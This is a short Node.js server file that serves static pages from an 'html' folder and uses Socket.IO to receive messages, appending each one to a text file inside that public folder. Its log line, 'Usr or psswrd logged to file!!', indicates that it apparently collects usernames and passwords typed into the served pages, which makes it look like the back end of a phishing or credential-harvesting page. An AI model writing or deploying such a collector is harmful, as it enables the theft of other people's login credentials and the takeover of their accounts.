const http = require("http");
const express = require("express");
const socketio = require("socket.io");
const path = require("path");
const fs = require('fs');

const app = express();
const httpserver = http.Server(app);
const io = socketio(httpserver);
const port_to_run = 3000;

const webdirectory = path.join(__dirname, "html");

app.use(express.static(webdirectory));

httpserver.listen(port_to_run);

console.log(`Server running locally at http://localhost:${port_to_run}/`);

io.on('connection', (socket) => {
    console.log('A user connected');

    socket.on('message', (message) => {
        console.log('Received message:', message); // Log the message on the server
        const data = message+'\n';
        fs.appendFile('./html/data_online/data_online.txt', data, (err) => {
            if (err) throw err;
            console.log('Usr or psswrd logged to file!!');
        });
    });

    socket.on('disconnect', () => {
        console.log('A user disconnected');
    });
});
